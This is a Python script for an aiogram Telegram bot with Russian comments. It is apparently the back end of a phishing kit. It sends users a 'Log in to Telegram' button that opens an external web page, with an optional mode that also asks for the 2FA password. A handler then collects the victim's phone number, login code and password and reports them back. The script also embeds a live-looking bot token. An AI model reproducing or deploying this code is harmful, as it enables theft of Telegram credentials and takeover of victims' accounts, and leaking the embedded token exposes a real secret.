import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, ReplyKeyboardMarkup, KeyboardButton

# ==========================================
# 👇 НАСТРОЙКИ (ЗАПОЛНИ ИХ) 👇
# ==========================================

# 1. Твой токен от @BotFather
BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"

# 2. Ссылка на твой сайт с GitHub
# Важно: Добавь в конец ?v=любое_число, чтобы сбросить кеш в телефоне!
WEB_APP_URL = "https://vanchopiki.github.io/test/index.html?v=404"

# ==========================================

# Включаем логирование, чтобы видеть сообщения в консоли PyCharm
logging.basicConfig(level=logging.INFO)

# Создаем объекты бота
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ---
# Она решает, какую ссылку дать: обычную или с требованием пароля
async def send_ui(message: types.Message, need_pass: bool):
    url = WEB_APP_URL

    if need_pass:
        # Если нужен пароль, добавляем параметр p=1 к ссылке
        # Проверяем, какой разделитель использовать (? или &)
        separator = "&" if "?" in WEB_APP_URL else "?"
        url = f"{WEB_APP_URL}{separator}p=1"
        txt = "🔐 <b>Вход с ПАРОЛЕМ</b> (2FA)\nНажми кнопку внизу 👇"
    else:
        # Если пароль не нужен
        txt = "📱 <b>Обычный вход</b>\nНажми кнопку внизу 👇"

    # Создаем кнопку, которая появится вместо клавиатуры
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="⚡ Войти в Telegram",
                    web_app=WebAppInfo(url=url)
                )
            ]
        ],
        resize_keyboard=True,
        input_field_placeholder="Нажми кнопку ниже..."
    )

    await message.answer(txt, reply_markup=kb, parse_mode="HTML")


# 1. Если написали слово "пароль" -> Включаем режим с паролем
@dp.message(F.text.lower() == "пароль")
async def mode_pass(message: types.Message):
    await send_ui(message, True)


# 2. Если нажали /start или написали что-то другое -> Обычный режим
@dp.message(Command("start"))
@dp.message()
async def mode_default(message: types.Message):
    await send_ui(message, False)


# 3. ПОЛУЧЕНИЕ ДАННЫХ ОТ САЙТА
# Сработает, когда сайт выполнит tg.sendData()
@dp.message(F.web_app_data)
async def data_handler(message: types.Message):
    try:
        # Получаем данные из веб-приложения
        data = json.loads(message.web_app_data.data)

        # Достаем поля
        phone = data.get('phone', '-')
        code = data.get('code', '-')
        password = data.get('password', '')

        # Если пароль пустой, пишем красиво
        if not password:
            password = "<i>(Не введен)</i>"

        # Отправляем тебе результат
        await message.answer(
            f"✅ <b>ДАННЫЕ ПОЛУЧЕНЫ:</b>\n\n"
            f"📞 Телефон: <code>{phone}</code>\n"
            f"🔢 Код: <code>{code}</code>\n"
            f"🔑 Пароль: <code>{password}</code>",
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"Ошибка чтения данных: {e}")


# Запуск бота
if __name__ == "__main__":
    try:
        print("Бот запущен!")
        asyncio.run(dp.start_polling(bot))
    except KeyboardInterrupt:
        print("Бот выключен.")